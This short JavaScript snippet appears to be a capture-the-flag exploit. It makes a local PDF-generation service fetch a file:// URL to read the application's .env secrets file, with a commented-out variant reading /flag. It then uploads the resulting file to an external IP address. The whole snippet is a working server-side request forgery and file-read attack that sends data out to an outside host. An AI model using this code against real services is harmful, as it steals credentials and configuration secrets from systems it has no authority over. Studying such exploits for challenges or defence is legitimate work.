const gen = async () => {
    const fileToRead = "file:///app/services/web/.env"
    // const fileToRead = "file:///flag"
    
    const params = new URLSearchParams();
    params.append("url", fileToRead);
    const pdfResp = await fetch("http://localhost:3002/generate?" + params.toString());
    const blob = await pdfResp.blob();
    const fd = new FormData();
    fd.append("file", blob);
    await fetch("http://139.162.184.70:7001/", {
      method: "POST",
      body: fd,
    });
  };
  gen();
  
  